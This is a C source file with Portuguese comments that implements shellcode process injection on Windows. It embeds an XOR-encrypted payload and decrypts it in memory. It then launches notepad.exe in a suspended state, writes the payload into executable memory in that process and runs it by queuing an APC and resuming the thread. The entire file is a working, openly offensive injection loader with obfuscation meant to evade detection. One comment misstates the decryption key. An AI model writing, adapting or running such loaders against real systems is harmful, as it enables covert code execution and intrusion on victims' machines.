#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h> // Adicionado para memcpy

// Payload criptografado (XOR com a chave "my")
unsigned char encryptedPayload[] =
"\x88\x2d\xf3\x90\x84\x8d\xb0\x74\x74\x65\x31\x25\x35\x35\x22\x25\x22\x2d\x41\xa6\x11\x2d\xfb\x26\x14\x2d\xfb\x26\x6c\x2d\xfb\x26\x54\x2d\xfb\x06\x24\x2d\x7f\xc3\x3e\x2f\x3d\x45\xbd\x2d\x41\xb4\xd8\x59\x11\x08\x76\x49\x50\x35\xb5\xac\x7d\x35\x75\xa4\x92\x99\x26\x24\x21\x3c\xff\x37\x50\xff\x36\x59\x38\x75\xa4\xee\xf0\xfc\x74\x65\x70\x3c\xf1\xa5\x04\x13\x3c\x64\xa0\x24\xff\x2d\x68\x30\xff\x25\x50\x3d\x75\xb5\x93\x22\x3c\x9a\xb9\x35\xff\x51\xf8\x3c\x75\xb3\x3d\x45\xbd\x2d\x41\xb4\xd8\x24\xb1\xbd\x79\x24\x71\xb5\x4c\x85\x05\x85\x38\x66\x3c\x50\x7c\x20\x49\xa5\x01\xbd\x28\x30\xff\x25\x54\x3d\x75\xb5\x16\x35\xff\x69\x38\x30\xff\x25\x6c\x3d\x75\xb5\x31\xff\x70\xed\x38\x75\xa4\x24\x28\x35\x2c\x3b\x29\x2e\x35\x3d\x31\x2d\x35\x3f\x38\xf7\x98\x45\x31\x26\x8b\x85\x28\x35\x2d\x3f\x38\xff\x66\x8c\x27\x8b\x8b\x9a\x2d\x3c\xce\x64\x70\x74\x74\x65\x70\x74\x74\x2d\xfd\xf9\x75\x64\x70\x74\x35\xdf\x41\xff\x1b\xe2\x8f\xa1\xcf\x85\x6d\x5e\x7e\x24\xca\xd2\xe1\xd8\xed\x8b\xa1\x2d\xf3\xb0\x5c\x59\x76\x08\x7e\xe5\x8b\x94\x01\x60\xcb\x33\x67\x17\x1f\x1e\x74\x3c\x31\xfd\xae\x9a\xa5\x17\x15\x09\x13\x5a\x11\x1d\x15\x74";

// Chave de descriptografia
char key[] = "tept";

// Função para descriptografar o payload
void DecryptPayload(unsigned char* output, const unsigned char* input, size_t size) {
    int keyLen = sizeof(key) - 1; // Remove o '\0' do tamanho
    for (int i = 0; i < size; i++) {
        output[i] = input[i] ^ key[i % keyLen];
    }
}

int main() {
    // 1. Descriptografar o payload no nosso processo
    size_t payloadSize = sizeof(encryptedPayload);
    unsigned char* decryptedPayload = (unsigned char*)malloc(payloadSize);

    if (!decryptedPayload) {
        printf("Erro ao alocar memória para descriptografia\n");
        return 1;
    }

    DecryptPayload(decryptedPayload, encryptedPayload, payloadSize);
    printf("Payload descriptografado com sucesso!\n");

    // 2. Configurações do processo alvo
    STARTUPINFOA startupInfo = { 0 };
    PROCESS_INFORMATION processInfo = { 0 };
    LPVOID remoteMem;
    HANDLE processHandle, threadHandle;

    startupInfo.cb = sizeof(STARTUPINFOA);

    // 3. Cria processo suspenso
    if (!CreateProcessA(
        "C:\\Windows\\System32\\notepad.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL,
        &startupInfo, &processInfo
    )) {
        printf("Erro ao criar processo: %lu\n", GetLastError());
        free(decryptedPayload);
        return 1;
    }

    printf("Processo criado com sucesso! PID: %lu\n", processInfo.dwProcessId);

    processHandle = processInfo.hProcess;
    threadHandle = processInfo.hThread;

    // 4. Aloca memória no processo alvo
    remoteMem = VirtualAllocEx(
        processHandle,
        NULL,
        payloadSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!remoteMem) {
        printf("Erro ao alocar memória: %lu\n", GetLastError());
        free(decryptedPayload);
        return 1;
    }

    // 5. Escreve o payload DESCRIPTOGRAFADO no processo alvo
    if (!WriteProcessMemory(processHandle, remoteMem, decryptedPayload, payloadSize, NULL)) {
        printf("Erro ao escrever memória: %lu\n", GetLastError());
        free(decryptedPayload);
        return 1;
    }

    printf("Payload descriptografado injetado em: %p\n", remoteMem);

    // 6. Enfileira a APC
    if (!QueueUserAPC((PAPCFUNC)remoteMem, threadHandle, (ULONG_PTR)NULL)) {
        printf("Erro ao enfileirar APC: %lu\n", GetLastError());
        free(decryptedPayload);
        return 1;
    }

    printf("APC enfileirada com sucesso!\n");

    // 7. Resume a thread
    ResumeThread(threadHandle);
    printf("Thread resumida! Aguarde...\n");

    // 8. Aguarda o processo terminar
    WaitForSingleObject(processHandle, INFINITE);

    // 9. Limpeza
    CloseHandle(processHandle);
    CloseHandle(threadHandle);
    free(decryptedPayload);

    return 0;
}
